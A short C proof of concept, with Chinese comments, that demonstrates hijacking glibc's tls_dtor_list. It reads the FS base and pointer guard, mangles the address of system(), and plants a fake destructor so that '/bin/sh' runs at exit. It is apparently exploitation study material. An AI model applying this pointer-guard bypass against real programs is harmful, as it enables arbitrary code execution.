#include <stdio.h>
#include <stdlib.h>
#include <string.h>

unsigned long long rotate_left(unsigned long long value, int left)
{
    return (value << left) | (value >> (sizeof(unsigned long long) * 8 - left));
    // value << left 将 value 左移 left 位，溢出的高位被丢弃。
    // value >> (bits_in_long_long - left) 将 value 右移 64 - left 位，即把溢出的高位移回低位。
    // 最后，通过按位或 (|) 操作将两部分合并，得到循环左移的结果。
}


int main() {
 unsigned long long fs_base;
 unsigned long long tls_dtor_list_addr;
 unsigned long long random_number;
 void *system_ptr = (void *)&system;
 printf("system:%p\n",system_ptr);
 asm("mov %%fs:0, %0" : "=r" (fs_base));// 使用汇编嵌入获取FS寄存器的值
 printf("Value in FS register: 0x%llx\n", fs_base);
 tls_dtor_list_addr = fs_base - 88;  // tls_dtor_list addr
 random_number = *(unsigned long long *)(fs_base + 0x30);  // random number 
 char *str_bin_sh = malloc(0x20);
 strcpy(str_bin_sh,"/bin/sh");
 void *ptr = malloc(0x20);
 *(unsigned long long *)ptr = rotate_left((unsigned long long)system_ptr ^ random_number,0x11);  // func ptr
 *(unsigned long long *)(ptr + 8) = str_bin_sh;  //arg 
 *(unsigned long long *)tls_dtor_list_addr = ptr;   //set tls_dtor_list
 return 0;
}